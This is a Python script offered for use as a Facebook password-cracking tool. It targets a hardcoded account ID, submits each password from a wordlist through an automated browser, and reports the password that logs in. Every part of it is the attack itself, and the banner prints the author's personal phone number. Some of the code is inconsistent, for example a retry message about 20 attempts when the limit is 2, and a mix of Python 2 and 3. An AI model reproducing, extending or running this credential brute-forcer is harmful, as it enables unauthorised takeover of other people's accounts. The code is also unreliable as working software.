#!/usr/bin/python
# -*- coding: utf-8 -*-
# Name: Babar Ali
# GitHub: https://github.com/hearthackerBabar
# Hearthacker

import time
import os
import concurrent.futures
import time

os.system('clear')
time.sleep(0.5)
try:
    import mechanize
except ModuleNotFoundError:
    print('[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2')
    exit()
os.system("clear")
print("""
\033[1;31m██╗░░██╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░
\033[1;31m██║░░██║██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░
\033[1;31m███████║███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░
\033[1;31m██╔══██║██╔══██║██║░░██╗██╔═██╗░██║██║╚████║██║░░╚██╗
\033[1;31m██║░░██║██║░░██║╚█████╔╝██║░╚██╗██║██║░╚███║╚██████╔╝
\033[1;31m╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░
\033[1;97m           [⚡\033[1;97mAuthor Name: Babar Ali     ⚡\033[1;97m]
\033[1;97m           [⚡\033[1;97mPhone Numbr: +923000223253 ⚡\033[1;97m]
\033[1;97m           [⚡\033[1;97mYutube Chnl: Pak Anonymous ⚡\033[1;97m]
\033[1;97m           [⚡       \033[1;97mFrom: Pakistan      ⚡\033[1;97m]

\033[1;47m\033[1;35m          Enter Facebook Account User Name                 \033[1;0m
""")
time.sleep(0.5)
user = '61566405698128'
time.sleep(0.8)
wrdlstFileName = './Pakistan.txt'
try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print('\n[!] File Not Found!')
    exit()

time.sleep(0.8)
print('\n\nCracking ' + user + ' Now...')

time.sleep(1)
print('\033[1;47m\033[1;31m               Cracking Has Been Started                   \033[1;0m   ')

def process_item(password):
    if password == '' or password == ' ':
        pass
    else:
        try:
            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
            fb = browser.open('https://facebook.com')
            dos = open('Facebook-Log.txt', 'w+')
            import time

            # Define the number of retries
            max_retries = 2
            retry_count = 0

            # Loop to try selecting the form
            while retry_count < max_retries:
                try:
                    # Try selecting the form
                    browser.select_form(nr=0)
                    # If the form is found, fill in the email
                    browser.form['email'] = user
                    # Exit the loop if successful
                    print("Form found and email field filled.")
                    break
                except Exception as e:
                    # If form is not found, increment the retry count
                    retry_count += 1
                    print(f"Attempt {retry_count}: Form not found. Retrying in 2 seconds...")
                    # Wait for 3 seconds before retrying
                    time.sleep(3)
            else:
                # If the form is not found after all attempts
                print("Failed to find form after 20 attempts.")

            browser.form['pass'] = password
            browser.method = 'POST'
            browser.submit()

            r = browser.open('https://facebook.com').read()
            # print(r, 'rrrrrrrrrrr')
            dos.write(r)
            dos.seek(0)
            text = dos.read().decode('UTF-8')
            if text.find('home_icon', 0, len(text)) != -1:
                print('\033[1;97m[+] \033[1;31mPassword Match : ' + password)
                dos.close()
                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                exit()
            else:
                print("\033[1;97m[+] \033[1;32mWrong Password : " + str(password))
        except KeyboardInterrupt:
            dos.close()
            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            exit()
        except Exception as e:
            print('\n#############################################\n   ', e)
            # dos.close()
            # os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            # exit()


# Use ThreadPoolExecutor to process the array in parallel
with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
    # Submit all items in the array to the thread pool
    results = list(executor.map(process_item, wordlist))

time.sleep(1)
print('Sorry, none of the passwords in your wordlist is right.')
time.sleep(0.8)
# dos.close()
os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
exit()
